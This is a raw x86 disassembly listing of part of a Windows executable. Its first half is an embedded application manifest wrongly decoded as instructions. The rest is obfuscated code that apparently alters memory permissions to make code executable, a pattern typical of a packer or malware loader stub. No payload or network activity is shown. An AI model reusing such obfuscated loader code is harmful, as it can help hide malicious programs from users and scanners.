  425b14:	jae    0x425b54
  425b16:	outs   dx,DWORD PTR ds:[esi]
  425b17:	inc    esp
  425b18:	imul   ecx,DWORD PTR [ebp+0x61],0x61706120
  425b1f:	and    BYTE PTR [esi],ch
  425b21:	je     0x425b43
  425b23:	and    BYTE PTR [esi+0x41],ch
  425b26:	inc    ebx
  425b27:	push   ebx
  425b28:	and    BYTE PTR gs:[ebx+0x4d],ah
  425b2c:	ins    DWORD PTR es:[edi],dx
  425b2d:	and    BYTE PTR [eax],ah
  425b2f:	and    BYTE PTR cs:[edx],bh
  425b32:	jb     0x425ba9
  425b34:	outs   dx,DWORD PTR ds:[esi]
  425b35:	push   ebx
  425b36:	and    BYTE PTR [ebp+0x74],bl
  425b39:	and    BYTE PTR [ecx+0x6f],al
  425b3c:	imul   ecx,DWORD PTR gs:[bp+si],0x654d656f
  425b44:	imul   esp,DWORD PTR [ebp+0x6f],0x65206962
  425b4b:	bound  esp,QWORD PTR [ebx+0x75]
  425b4e:	and    dh,BYTE PTR [eax+0x62]
  425b51:	data16 jo 0x425bbd
  425b54:	imul   eax,DWORD PTR [edi+edx*2+0x2e],0x6d727365
  425b5c:	arpl   WORD PTR [ebx+0x3c],dx
  425b5f:	jb     0x425b81
  425b61:	cmp    al,0x3c
  425b63:	and    BYTE PTR [esi+0x3e],ch
  425b66:	outs   dx,DWORD PTR ds:[esi]
  425b67:	cmp    bh,BYTE PTR gs:0x732e6972
  425b6e:	jae    0x425bdf
  425b70:	inc    esp
  425b71:	popa   
  425b72:	jb     0x425bb5
  425b74:	bound  ebp,QWORD PTR [esi+0x73]
  425b77:	outs   dx,BYTE PTR ds:[esi]
  425b78:	gs jo  0x425bce
  425b7b:	jae    0x425bde
  425b7d:	gs cmp eax,0x75727474
  425b83:	gs jo  0x425bb4
  425b86:	je     0x425bed
  425b88:	js     0x425bef
  425b8a:	je     0x425bef
  425b8c:	outs   dx,BYTE PTR ds:[esi]
  425b8d:	jae    0x425bfd
  425b8f:	cs ins DWORD PTR es:[edi],dx
  425b91:	outs   dx,BYTE PTR ds:[esi]
  425b92:	outs   dx,DWORD PTR gs:[esi]
  425b94:	inc    ecx
  425b95:	jb     0x425bd4
  425b97:	outs   dx,DWORD PTR ds:[esi]
  425b98:	cs inc ecx
  425b9a:	outs   dx,DWORD PTR ds:[esi]
  425b9b:	outs   dx,BYTE PTR ds:[esi]
  425b9c:	cs jb  0x425bcd
  425b9f:	outs   dx,BYTE PTR ds:[esi]
  425ba0:	jae    0x425bd0
  425ba2:	popa   
  425ba3:	and    ebp,DWORD PTR [esi]
  425ba5:	cs dec ebp
  425ba7:	pop    ebp
  425ba8:	and    BYTE PTR [ebp+esi*2+0x20],dh
  425bac:	ins    DWORD PTR es:[edi],dx
  425bad:	imul   ebp,DWORD PTR [ebp+0x65],0xd732e3e
  425bb4:	cmp    eax,0x2e697257
  425bb9:	push   ebx
  425bba:	and    BYTE PTR [edx+0xd],dl
  425bbd:	bound  edx,QWORD PTR [ebx+0x72]
  425bc0:	ins    DWORD PTR es:[edi],dx
  425bc1:	and    BYTE PTR [ebp+0xa],ah
  425bc4:	jne    0x425c33
  425bc6:	and    BYTE PTR gs:[ebp*2+0x616d6965],bh
  425bce:	ins    DWORD PTR es:[edi],dx
  425bcf:	imul   edi,DWORD PTR [edx],0x20696561
  425bd5:	je     0x425c3e
  425bd7:	inc    ecx
  425bd8:	cs cs jb 0x425c55
  425bdc:	jb     0x425c1a
  425bde:	ins    WORD PTR es:[edi],dx
  425be0:	jns    0x425c50
  425be2:	jae    0x425c49
  425be4:	cs popa 
  425be6:	bound  esp,QWORD PTR [eax]
  425be8:	jae    0x425c58
  425bea:	outs   dx,BYTE PTR ds:[esi]
  425beb:	ins    DWORD PTR es:[edi],dx
  425bec:	and    BYTE PTR [edx],cl
  425bee:	cmp    al,0x65
  425bf0:	and    BYTE PTR [edx+esi*2],bh
  425bf3:	ins    DWORD PTR es:[edi],dx
  425bf4:	data16 and BYTE PTR [edx],bh
  425bf7:	jb     0x425c19
  425bf9:	cmp    al,0x69
  425bfb:	jae    0x425c60
  425bfd:	bound  esp,QWORD PTR [eax]
  425bff:	imul   eax,DWORD PTR [ecx+ebp*2+0x65],0x4d724468
  425c07:	ins    DWORD PTR es:[edi],dx
  425c08:	sub    BYTE PTR [ecx+0x6d],ah
  425c0b:	je     0x425c2d
  425c0d:	cmp    ah,BYTE PTR [ebp+0x72]
  425c10:	ins    DWORD PTR es:[edi],dx
  425c11:	imul   esp,DWORD PTR [edx+0x65],0x6920442f
  425c18:	jb     0x425c87
  425c1a:	inc    ecx
  425c1b:	cmp    eax,0x656c4d52
  425c20:	imul   esi,DWORD PTR [ebp+ecx*1+0x2e],0x72692f65
  425c28:	and    BYTE PTR [ebx+0xa],dl
  425c2b:	outs   dx,DWORD PTR ds:[esi]
  425c2c:	jo     0x425c4e
  425c2e:	ds inc ecx
  425c30:	cmp    eax,0x3e650a6d
  425c35:	bound  ebp,QWORD PTR [esi]
  425c37:	cs or  eax,0x646d6461
  425c3d:	gs jns 0x425c7d
  425c40:	jb     0x425c95
  425c42:	gs jb  0x425cb2
  425c45:	jb     0x425cba
  425c47:	jb     0x425c53
  425c49:	gs data16 js 0x425cb0
  425c4d:	and    BYTE PTR [ecx+0x6b],ch
  425c50:	imul   esp,DWORD PTR [eax],0x6d727467
  425c56:	ins    DWORD PTR es:[edi],dx
  425c57:	push   edx
  425c58:	and    BYTE PTR [eax],ch
  425c5a:	jb     0x425cc5
  425c5c:	outs   dx,DWORD PTR ds:[esi]
  425c5d:	push   ebx
  425c5e:	bound  ebp,QWORD PTR [ebp+0x74]
  425c61:	and    BYTE PTR [ebx+eiz*2+0x3c],ah
  425c65:	outs   dx,BYTE PTR ds:[esi]
  425c66:	jo     0x425cdb
  425c68:	imul   ebp,DWORD PTR [ecx+0x65],0x2e656563
  425c6f:	and    BYTE PTR [esi],ch
  425c71:	push   ebx
  425c72:	jne    0x425cdd
  425c74:	push   ebx
  425c75:	outs   dx,DWORD PTR ds:[esi]
  425c76:	addr16 or eax,0x6f736520
  425c7c:	ds inc esp
  425c7e:	gs je  0x425cc5
  425c81:	imul   esi,DWORD PTR [edx+ecx*1+0x54],0x7265200a
  425c89:	and    BYTE PTR [ebp+0x6e],ch
  425c8c:	and    BYTE PTR [esi+ebp*1+0x63],dh
  425c90:	and    BYTE PTR gs:[esi+0x3c],ch
  425c94:	das    
  425c95:	sub    al,0x61
  425c97:	arpl   WORD PTR [ebp+0x73],sp
  425c9a:	jae    0x425cfd
  425c9c:	gs das 
  425c9e:	push   ebx
  425c9f:	imul   esp,DWORD PTR [ebx+0x6e],0x61627376
  425ca6:	gs jo  0x425ced
  425ca9:	outs   dx,BYTE PTR ds:[esi]
  425caa:	cmp    eax,0x2e205772
  425caf:	or     ah,BYTE PTR [ebx+0x6f]
  425cb2:	js     0x425cd6
  425cb4:	fs jb  0x425d29
  425cb7:	cmp    al,0x53
  425cb9:	push   ebx
  425cba:	and    BYTE PTR [esi],bh
  425cbc:	jbe    0x425d27
  425cbe:	outs   dx,BYTE PTR gs:[esi]
  425cc0:	data16 jae 0x425d30
  425cc3:	jb     0x425d34
  425cc5:	cs je  0x425d31
  425cc8:	cmp    al,0x69
  425cca:	and    BYTE PTR [ebp+0x69],ah
  425ccd:	gs push eax
  425ccf:	imul   esp,DWORD PTR [eax],0x70636520
  425cd5:	and    BYTE PTR [ebp+0x73],ah
  425cd8:	jbe    0x425d3d
  425cda:	sub    BYTE PTR gs:[ebx+0x74],dh
  425cde:	imul   esp,DWORD PTR [eax],0x656f4165
  425ce4:	jae    0x425d54
  425ce6:	bound  ecx,QWORD PTR [ebp+0x65]
  425ce9:	push   edx
  425cea:	ds jae 0x425d0f
  425ced:	gs jae 0x425d2c
  425cf0:	jb     0x425d54
  425cf2:	jae    0x425d61
  425cf4:	ins    DWORD PTR es:[edi],dx
  425cf5:	outs   dx,DWORD PTR ds:[esi]
  425cf6:	jne    0x425d45
  425cf8:	inc    ecx
  425cf9:	jae    0x425d71
  425cfb:	bound  ebp,QWORD PTR ds:0x2365
  425d00:	and    BYTE PTR [ebp+0x5b],ch
  425d03:	outs   dx,BYTE PTR ds:[esi]
  425d04:	imul   edx,DWORD PTR [ebx+0x67],0x6e656d61
  425d0b:	gs jns 0x425d4c
  425d0e:	je     0x425d4a
  425d10:	gs jb  0x425d78
  425d13:	jne    0x425d7a
  425d15:	popa   
  425d16:	jb     0x425d3a
  425d18:	bound  ebp,QWORD PTR [ecx+0xd]
  425d1b:	or     ah,BYTE PTR gs:[eax]
  425d1e:	je     0x425d8d
  425d20:	push   edx
  425d21:	jae    0x425d43
  425d23:	inc    edi
  425d24:	je     0x425d46
  425d26:	jb     0x425d9b
  425d28:	arpl   WORD PTR [edx+0x73],si
  425d2b:	jb     0x425d90
  425d2d:	outs   dx,DWORD PTR ds:[esi]
  425d2e:	cs jb  0x425d96
  425d31:	jb     0x425d96
  425d33:	outs   dx,BYTE PTR ds:[esi]
  425d34:	jb     0x425da5
  425d36:	bound  ebp,QWORD PTR [esi+0x20]
  425d39:	je     0x425daf
  425d3b:	js     0x425d90
  425d3d:	jne    0x425db2
  425d3f:	jo     0x425db0
  425d41:	outs   dx,DWORD PTR ds:[esi]
  425d42:	ins    DWORD PTR es:[edi],dx
  425d43:	jo     0x425d65
  425d45:	and    BYTE PTR [ebx+0x6d],dh
  425d48:	and    BYTE PTR [edx],cl
  425d4a:	cs cmp eax,0x6973630d
  425d50:	ins    DWORD PTR es:[edi],dx
  425d51:	and    BYTE PTR ds:[eax+eiz*1+0x61],al
  425d56:	jb     0x425dbd
  425d58:	and    BYTE PTR [ebp+0x72],ah
  425d5b:	dec    ebp
  425d5c:	jb     0x425dcb
  425d5e:	push   edx
  425d5f:	dec    ebp
  425d60:	and    BYTE PTR [ebx+eiz*2+0x69],dh
  425d64:	ds dec ebp
  425d66:	outs   dx,BYTE PTR ds:[esi]
  425d67:	imul   ebp,DWORD PTR [edi+0x3c],0x76202e2e
  425d6e:	je     0x425dd9
  425d70:	ins    DWORD PTR es:[edi],dx
  425d71:	jo     0x425d93
  425d73:	imul   eax,DWORD PTR [ebx+0x69],0x6c43656d
  425d7a:	arpl   WORD PTR gs:[ebp+0x75],cx
  425d7e:	popa   
  425d7f:	outs   dx,DWORD PTR ds:[esi]
  425d81:	ins    DWORD PTR es:[edi],dx
  425d82:	imul   esp,DWORD PTR gs:[edx+0x69],0x720d446e
  425d8a:	sub    DWORD PTR [esi+0x72],ebp
  425d8d:	ins    DWORD PTR es:[edi],dx
  425d8e:	cmp    al,0x3a
  425d90:	jb     0x425e06
  425d92:	outs   dx,BYTE PTR ds:[esi]
  425d93:	and    BYTE PTR ds:[ecx+0x65],ch
  425d97:	and    BYTE PTR [eax],ah
  425d99:	jo     0x425da5
  425d9b:	and    cl,BYTE PTR [ebp+0x57]
  425d9e:	jae    0x425e13
  425da0:	jb     0x425e16
  425da2:	cs popa 
  425da4:	inc    ecx
  425da5:	outs   dx,BYTE PTR ds:[esi]
  425da6:	and    BYTE PTR [edx+0x20],dh
  425da9:	jae    0x425e1e
  425dab:	or     eax,0x2e736520
  425db0:	imul   esp,DWORD PTR [ebp+eiz*2+0x6d],0x44536f20
  425db8:	jb     0x425e2c
  425dba:	outs   dx,BYTE PTR ds:[esi]
  425dbb:	jae    0x425dca
  425dbd:	arpl   WORD PTR cs:[esi],di
  425dc0:	push   0x7669706e
  425dc5:	outs   dx,BYTE PTR ds:[esi]
  425dc6:	arpl   WORD PTR gs:[esi+0x6d],bp
  425dca:	ja     0x425e19
  425dcc:	arpl   WORD PTR [ebp+0x73],si
  425dcf:	and    BYTE PTR [ebp+0x57],ah
  425dd2:	bound  ebp,QWORD PTR [edi+0x6e]
  425dd5:	gs jb  0x425dfa
  425dd8:	imul   esi,DWORD PTR [ebp+0x74],0x2f696f72
  425ddf:	arpl   WORD PTR [ebp+0x6d],sp
  425de2:	ins    DWORD PTR es:[edi],dx
  425de3:	ins    DWORD PTR es:[edi],dx
  425de4:	inc    ebx
  425de5:	data16 and BYTE PTR fs:[edi+0x65],ch
  425dea:	ins    BYTE PTR es:[edi],dx
  425deb:	outs   dx,DWORD PTR ds:[esi]
  425dec:	or     ch,BYTE PTR [ecx+0x6f]
  425def:	push   edi
  425df0:	jns    0x425e12
  425df2:	jb     0x425e61
  425df4:	or     dl,BYTE PTR [ebx+0x65]
  425df7:	jne    0x425e5e
  425df9:	jb     0x425e1b
  425dfb:	bound  esi,QWORD PTR [ebx+0x20]
  425dfe:	and    BYTE PTR [eax],ah
  425e00:	imul   ebp,DWORD PTR [ebp+0x6d],0x666d286e
  425e07:	inc    ebx
  425e08:	das    
  425e09:	push   ebx
  425e0a:	gs jo  0x425e86
  425e0d:	arpl   WORD PTR [eax],sp
  425e0f:	jb     0x425e7f
  425e11:	gs jne 0x425e58
  425e14:	and    BYTE PTR [edi+0x74],ch
  425e17:	jb     0x425e7c
  425e19:	push   ebx
  425e1a:	je     0x425e8e
  425e1c:	push   ebx
  425e1d:	cs jb  0x425e94
  425e20:	imul   esi,DWORD PTR [ebp+0x29],0x626f6e74
  425e27:	gs push ebx
  425e29:	inc    esp
  425e2a:	ins    DWORD PTR es:[edi],dx
  425e2b:	je     0x425e9c
  425e2d:	cs jo  0x425e71
  425e30:	arpl   WORD PTR [eax+0x65],bp
  425e33:	arpl   WORD PTR [edx+eiz*1+0x20],bp
  425e37:	gs ins DWORD PTR es:[edi],dx
  425e39:	je     0x425eaf
  425e3b:	jae    0x425e9e
  425e3d:	ja     0x425ea5
  425e3f:	inc    ecx
  425e40:	jbe    0x425ea5
  425e42:	cmp    al,0x44
  425e44:	pop    ebx
  425e45:	ret    
  425e46:	bound  edx,QWORD PTR gs:[ebx+0x20]
  425e4a:	and    BYTE PTR [eax],ah
  425e4c:	and    BYTE PTR [eax],ah
  425e4e:	and    BYTE PTR [eax],ah
  425e50:	and    BYTE PTR [eax],ah
  425e52:	fs gs jae 0x425eb9
  425e56:	jb     0x425ec1
  425e58:	jo     0x425ece
  425e5a:	imul   ebp,DWORD PTR [edi+0x6e],0x78657420
  425e61:	je     0x425e91
  425e63:	or     eax,0x2020200a
  425e68:	and    BYTE PTR [eax],ah
  425e6a:	and    BYTE PTR [eax],ah
  425e6c:	and    BYTE PTR [eax],ah
  425e6e:	and    BYTE PTR [eax],ah
  425e70:	and    BYTE PTR [edi+ebp*1],bh
  425e73:	jo     0x425ed6
  425e75:	jb     0x425ed8
  425e77:	ins    DWORD PTR es:[edi],dx
  425e78:	ds or  eax,0x2020200a
  425e7e:	and    BYTE PTR [edi+ebp*1],bh
  425e81:	ins    DWORD PTR es:[edi],dx
  425e82:	gs ins DWORD PTR es:[edi],dx
  425e84:	bound  esp,QWORD PTR [ebp+0x72]
  425e87:	ds or  eax,0x2020200a
  425e8d:	and    BYTE PTR [ebp*2+0x65626d65],bh
  425e94:	jb     0x425eb6
  425e96:	outs   dx,BYTE PTR ds:[esi]
  425e97:	popa   
  425e98:	ins    DWORD PTR es:[edi],dx
  425e99:	gs cmp eax,0x4d3a5022
  425e9f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  425ea6:	je     0x425ed6
  425ea8:	inc    esp
  425ea9:	gs jbe 0x425eed
  425eac:	jo     0x425f1e
  425eae:	jae    0x425ede
  425eb0:	push   edi
  425eb1:	bound  edx,QWORD PTR gs:[ebx+0x65]
  425eb5:	jb     0x425f2d
  425eb7:	imul   esp,DWORD PTR [ebx+0x65],0x73572e73
  425ebe:	fs ins BYTE PTR es:[edi],dx
  425ec0:	push   edx
  425ec1:	gs jae 0x425f33
  425ec4:	jne    0x425f38
  425ec6:	arpl   WORD PTR [ebp+0x73],sp
  425ec9:	cs push edx
  425ecb:	gs jae 0x425f12
  425ece:	gs jae 0x425f34
  425ed1:	jb     0x425f3c
  425ed3:	jo     0x425f49
  425ed5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  425edc:	imul   esp,DWORD PTR [edx+0x75],0x442e6574
  425ee3:	gs jae 0x425f49
  425ee6:	jb     0x425f51
  425ee8:	jo     0x425f5e
  425eea:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d3e22
  425ef1:	and    BYTE PTR [eax],ah
  425ef3:	and    BYTE PTR [eax],ah
  425ef5:	and    BYTE PTR [eax],ah
  425ef7:	cmp    al,0x73
  425ef9:	jne    0x425f68
  425efb:	ins    DWORD PTR es:[edi],dx
  425efc:	popa   
  425efd:	jb     0x425f78
  425eff:	ds or  eax,0x2020200a
  425f05:	and    BYTE PTR [eax],ah
  425f07:	and    BYTE PTR [eax],ah
  425f09:	and    BYTE PTR [eax],ah
  425f0b:	and    BYTE PTR [eax],ah
  425f0d:	and    BYTE PTR [eax],ah
  425f0f:	and    BYTE PTR [eax],ah
  425f11:	and    BYTE PTR [edx+0x65],dl
  425f14:	je     0x425f88
  425f16:	imul   esp,DWORD PTR [ebp+0x76],0x74207365
  425f1d:	push   0x65642065
  425f22:	jae    0x425f87
  425f24:	jb     0x425f8f
  425f26:	jo     0x425f9c
  425f28:	imul   ebp,DWORD PTR [edi+0x6e],0x78657420
  425f2f:	je     0x425f5f
  425f31:	or     eax,0x2020200a
  425f36:	and    BYTE PTR [eax],ah
  425f38:	and    BYTE PTR [eax],ah
  425f3a:	and    BYTE PTR [eax],ah
  425f3c:	and    BYTE PTR [eax],ah
  425f3e:	and    BYTE PTR [edi+ebp*1],bh
  425f41:	jae    0x425fb8
  425f43:	ins    DWORD PTR es:[edi],dx
  425f44:	ins    DWORD PTR es:[edi],dx
  425f45:	popa   
  425f46:	jb     0x425fc1
  425f48:	ds or  eax,0x2020200a
  425f4e:	and    BYTE PTR [eax],ah
  425f50:	and    BYTE PTR [edx+esi*2],bh
  425f53:	gs je  0x425fcb
  425f56:	jb     0x425fc6
  425f58:	jae    0x425f98
  425f5a:	or     eax,0x2020200a
  425f5f:	and    BYTE PTR [eax],ah
  425f61:	and    BYTE PTR [eax],ah
  425f63:	and    BYTE PTR [eax],ah
  425f65:	and    BYTE PTR [eax],ah
  425f67:	and    BYTE PTR [eax],ah
  425f69:	and    BYTE PTR [eax],ah
  425f6b:	and    BYTE PTR [ebp+eiz*2+0x73],ah
  425f6f:	arpl   WORD PTR [edx+0x69],si
  425f72:	jo     0x425fe8
  425f74:	imul   ebp,DWORD PTR [edi+0x6e],0x20200a0d
  425f7b:	and    BYTE PTR [eax],ah
  425f7d:	and    BYTE PTR [eax],ah
  425f7f:	and    BYTE PTR [eax],ah
  425f81:	and    BYTE PTR [eax],ah
  425f83:	and    BYTE PTR [eax],ah
  425f85:	cmp    al,0x2f
  425f87:	push   ebp
  425f88:	mov    ebp,esp
  425f8a:	movzx  eax,BYTE PTR [ebp+0x8]
  425f8e:	mov    ecx,DWORD PTR ds:0x43e07c
  425f94:	and    DWORD PTR ds:0x43e09c,0x0
  425f9b:	push   ebx
  425f9c:	mov    ebx,DWORD PTR [ebp+0x10]
  425f9f:	push   esi
  425fa0:	lea    esi,[eax+ecx*1+0x4]
  425fa4:	mov    eax,ds:0x43e05c
  425fa9:	lea    eax,[eax+ebx*1+0x4]
  425fad:	push   edi
  425fae:	mov    DWORD PTR ds:0x43e058,esi
  425fb4:	mov    ds:0x43e098,eax
  425fb9:	lea    eax,ds:0x4392e2
  425fbf:	add    edx,ecx
  425fc1:	sub    eax,0x282
  425fc6:	dec    edi
  425fc7:	mov    eax,DWORD PTR [eax]
  425fc9:	sub    ecx,eax
  425fcb:	mov    ds:0x464e88,eax
  425fd0:	mov    ecx,DWORD PTR ds:0x43e094
  425fd6:	push   0x48
  425fd8:	xor    edx,edx
  425fda:	mov    eax,ecx
  425fdc:	pop    edi
  425fdd:	div    edi
  425fdf:	cmp    eax,0x65
  425fe2:	mov    eax,DWORD PTR [ebp+0x10]
  425fe5:	jbe    0x425ffc
  425fe7:	mov    edx,DWORD PTR ds:0x43e098
  425fed:	add    edx,eax
  425fef:	lea    ecx,[ecx+edx*1+0x3ef9]
  425ff6:	mov    DWORD PTR ds:0x43e094,ecx
  425ffc:	lea    edx,[esi+ebx*1+0x1f]
  426000:	mov    DWORD PTR ds:0x43e07c,edx
  426006:	lea    edx,[ecx+eax*1-0x32]
  42600a:	cmp    edx,0x23e
  426010:	jb     0x426026
  426012:	mov    edx,eax
  426014:	sub    edx,ecx
  426016:	add    edx,0x2e
  426019:	and    DWORD PTR ds:0x43e09c,0x0
  426020:	mov    DWORD PTR ds:0x43e098,edx
  426026:	lea    ecx,[ebp+0x8]
  426029:	push   ecx
  42602a:	push   0x40
  42602c:	push   eax
  42602d:	push   DWORD PTR [ebp+0xc]
  426030:	call   DWORD PTR ds:0x464e88
  426036:	sub    ebx,DWORD PTR ds:0x43e058
  42603c:	pop    edi
  42603d:	add    ebx,0x2e
  426040:	pop    esi
  426041:	mov    DWORD PTR ds:0x43e07c,ebx
  426047:	mov    eax,ebx
  426049:	pop    ebx
  42604a:	pop    ebp
  42604b:	ret    
  42604c:	push   ecx
  42604d:	push   ebx
  42604e:	push   ebp
  42604f:	push   esi
  426050:	mov    esi,DWORD PTR ds:0x43e098
  426056:	mov    DWORD PTR [esp+0xc],0x9b9
  42605e:	push   edi
  42605f:	mov    edi,DWORD PTR ds:0x43e09c
  426065:	mov    ebx,eax
  426067:	mov    eax,DWORD PTR [esp+0x10]
  42606b:	mov    ecx,eax
  42606d:	dec    ecx
  42606e:	je     0x426096
  426070:	sub    ecx,0x12
  426073:	je     0x42608f
  426075:	xor    edx,edx
  426077:	xor    ebp,ebp
  426079:	lea    ecx,[eax+0x2e]
  42607c:	sub    ecx,eax
  42607e:	sbb    edx,ebp
  426080:	sub    ecx,esi
  426082:	sbb    edx,edi
  426084:	add    ecx,0x2e
  426087:	adc    edx,ebp
  426089:	mov    esi,ecx
  42608b:	mov    edi,edx
  42608d:	jmp    0x42609e
  42608f:	lea    esi,[ebx+0x18]
  426092:	xor    edi,edi
  426094:	jmp    0x42609e
  426096:	movzx  eax,si
  426099:	sub    eax,ebx
  42609b:	inc    eax
  42609c:	mov    ebx,eax
  42609e:	lea    eax,[esi+ebx*1+0x5]
  4260a2:	cmp    ebx,eax
  4260a4:	jne    0x4260c8
  4260a6:	push   0x0
  4260a8:	push   0x5c
  4260aa:	push   edi
  4260ab:	push   esi
  4260ac:	call   0x437b80
  4260b1:	xor    ecx,ecx
  4260b3:	cmp    ebx,eax
  4260b5:	jne    0x4260bb
  4260b7:	cmp    ecx,edx
  4260b9:	je     0x4260c4
  4260bb:	mov    eax,ebx
  4260bd:	sub    eax,esi
  4260bf:	add    eax,0x2e
  4260c2:	jmp    0x4260c8
  4260c4:	lea    eax,[esi+ebx*1+0x4]
  4260c8:	xor    edx,edx
  4260ca:	mov    ecx,eax
  4260cc:	add    ecx,esi
  4260ce:	adc    edx,edi
  4260d0:	add    ecx,0x32
  4260d3:	adc    edx,0x0
  4260d6:	xor    ebp,ebp
  4260d8:	cmp    ecx,ebx
  4260da:	jne    0x4260e4
  4260dc:	cmp    edx,ebp
  4260de:	jne    0x4260e4
  4260e0:	lea    eax,[esi+ebx*1+0x1f]
  4260e4:	dec    DWORD PTR [esp+0x10]
  4260e8:	jne    0x42606b
  4260ea:	mov    DWORD PTR ds:0x43e09c,edi
  4260f0:	pop    edi
  4260f1:	mov    DWORD PTR ds:0x43e098,esi
  4260f7:	pop    esi
  4260f8:	pop    ebp
  4260f9:	pop    ebx
  4260fa:	pop    ecx
  4260fb:	ret    
  4260fc:	push   ebp
  4260fd:	mov    ebp,esp
  4260ff:	sub    esp,0x64
  426102:	push   esi
  426103:	push   edi
  426104:	mov    DWORD PTR [ebp-0x8],0x93
  42610b:	movzx  eax,BYTE PTR [ebp-0x8]
  42610f:	mov    ecx,DWORD PTR ds:0x43e05c
  426115:	lea    eax,[ecx+eax*1-0xe]
  426119:	mov    DWORD PTR [ebp-0xc],eax
  42611c:	mov    eax,DWORD PTR [ebp+0x8]
  42611f:	mov    ecx,DWORD PTR ds:0x43e07c
  426125:	lea    eax,[ecx+eax*1-0x32]
  426129:	cmp    eax,0x23e
  42612e:	jb     0x426141
  426130:	mov    eax,DWORD PTR [ebp+0x8]
  426133:	add    eax,0x2e
  426136:	sub    eax,DWORD PTR ds:0x43e07c
  42613c:	mov    ds:0x43e094,eax
  426141:	mov    eax,DWORD PTR [ebp-0x8]
  426144:	mov    ecx,DWORD PTR [ebp-0xc]
  426147:	lea    eax,[ecx+eax*1+0x1f]
  42614b:	mov    ds:0x43e05c,eax
  426150:	mov    eax,ds:0x43e058
  426155:	mov    ecx,DWORD PTR ds:0x43e07c
  42615b:	lea    eax,[ecx+eax*1+0x32]
  42615f:	cmp    eax,DWORD PTR [ebp+0x8]
  426162:	jne    0x426176
  426164:	mov    eax,DWORD PTR [ebp+0x8]
  426167:	mov    ecx,DWORD PTR ds:0x43e07c
  42616d:	lea    eax,[ecx+eax*1+0x1f]
  426171:	mov    ds:0x43e058,eax
  426176:	mov    eax,DWORD PTR [ebp-0x8]
  426179:	sub    eax,0x3222
  42617e:	sub    eax,DWORD PTR ds:0x43e07c
  426184:	mov    ds:0x43e07c,eax
  426189:	lea    eax,ds:0x43929a
  42618f:	inc    edi
  426190:	neg    edi
  426192:	sub    eax,0x282
  426197:	dec    edi
  426198:	mov    eax,DWORD PTR [eax]
  42619a:	and    edx,edx
  42619c:	mov    ds:0x464e90,eax
  4261a1:	push   0x9a4
  4261a6:	push   DWORD PTR [ebp+0xc]
  4261a9:	push   DWORD PTR [ebp-0x8]
  4261ac:	call   0x425f87
  4261b1:	add    esp,0xc
  4261b4:	mov    eax,ds:0x43e098
  4261b9:	mov    DWORD PTR [ebp-0x28],eax
  4261bc:	mov    eax,ds:0x43e09c
  4261c1:	mov    DWORD PTR [ebp-0x24],eax
  4261c4:	cmp    DWORD PTR [ebp-0x28],0x1
  4261c8:	jne    0x4261d0
  4261ca:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ce:	je     0x4261de
  4261d0:	cmp    DWORD PTR [ebp-0x28],0x13
  4261d4:	jne    0x4261dc
  4261d6:	cmp    DWORD PTR [ebp-0x24],0x0
  4261da:	je     0x426229
  4261dc:	jmp    0x42624a
  4261de:	mov    eax,DWORD PTR [ebp+0x8]
  4261e1:	xor    ecx,ecx
  4261e3:	mov    esi,DWORD PTR ds:0x43e098
  4261e9:	sub    esi,eax
  4261eb:	mov    edi,DWORD PTR ds:0x43e09c
  4261f1:	sbb    edi,ecx
  4261f3:	movzx  eax,WORD PTR ds:0x43e098
  4261fa:	cdq    
  4261fb:	add    esi,eax
  4261fd:	adc    edi,edx
  4261ff:	mov    DWORD PTR [ebp+0x8],esi
  426202:	mov    eax,ds:0x43e098
  426207:	add    eax,0x1f
  42620a:	mov    ecx,DWORD PTR ds:0x43e09c
  426210:	adc    ecx,0x0
  426213:	mov    edx,DWORD PTR [ebp+0x8]
  426216:	xor    esi,esi
  426218:	add    eax,edx
  42621a:	adc    ecx,esi
  42621c:	mov    ds:0x43e098,eax
  426221:	mov    DWORD PTR ds:0x43e09c,ecx
  426227:	jmp    0x42629a
  426229:	mov    eax,DWORD PTR [ebp+0x8]
  42622c:	add    eax,0x5
  42622f:	xor    ecx,ecx
  426231:	add    eax,DWORD PTR ds:0x43e098
  426237:	adc    ecx,DWORD PTR ds:0x43e09c
  42623d:	mov    ds:0x43e098,eax
  426242:	mov    DWORD PTR ds:0x43e09c,ecx
  426248:	jmp    0x42629a
  42624a:	mov    eax,ds:0x43e098
  42624f:	add    eax,0x2e
  426252:	mov    ecx,DWORD PTR ds:0x43e09c
  426258:	adc    ecx,0x0
  42625b:	sub    eax,DWORD PTR ds:0x43e098
  426261:	sbb    ecx,DWORD PTR ds:0x43e09c
  426267:	mov    ds:0x43e098,eax
  42626c:	mov    DWORD PTR ds:0x43e09c,ecx
  426272:	mov    eax,ds:0x43e098
  426277:	add    eax,0x2e
  42627a:	mov    ecx,DWORD PTR ds:0x43e09c
  426280:	adc    ecx,0x0
  426283:	sub    eax,DWORD PTR ds:0x43e098
  426289:	sbb    ecx,DWORD PTR ds:0x43e09c
  42628f:	mov    ds:0x43e098,eax
  426294:	mov    DWORD PTR ds:0x43e09c,ecx
  42629a:	mov    eax,DWORD PTR [ebp-0x8]
  42629d:	sub    eax,0x3222
  4262a2:	sub    eax,DWORD PTR [ebp-0xc]
  4262a5:	mov    DWORD PTR [ebp-0xc],eax
  4262a8:	mov    eax,ds:0x43e07c
  4262ad:	imul   eax,eax,0x5c
  4262b0:	cmp    DWORD PTR [ebp+0x8],eax
  4262b3:	je     0x4262c8
  4262b5:	mov    eax,DWORD PTR [ebp+0x8]
  4262b8:	add    eax,0x2e
  4262bb:	sub    eax,DWORD PTR ds:0x43e07c
  4262c1:	mov    ds:0x43e07c,eax
  4262c6:	jmp    0x4262da
  4262c8:	mov    eax,DWORD PTR [ebp+0x8]
  4262cb:	mov    ecx,DWORD PTR ds:0x43e07c
  4262d1:	lea    eax,[ecx+eax*1+0x4]
  4262d5:	mov    ds:0x43e07c,eax
  4262da:	mov    eax,DWORD PTR [ebp+0xc]
  4262dd:	sub    eax,0x330c458b
  4262e2:	mov    ds:0x464e9c,eax
  4262e7:	mov    eax,DWORD PTR [ebp-0xc]
  4262ea:	mov    ecx,DWORD PTR [ebp-0x8]
  4262ed:	lea    eax,[ecx+eax*1+0x3ef9]
  4262f4:	add    eax,DWORD PTR ds:0x43e05c
  4262fa:	mov    ds:0x43e05c,eax
  4262ff:	mov    eax,DWORD PTR [ebp-0xc]
  426302:	mov    ecx,DWORD PTR [ebp-0x8]
  426305:	lea    eax,[ecx+eax*1+0x3ef9]
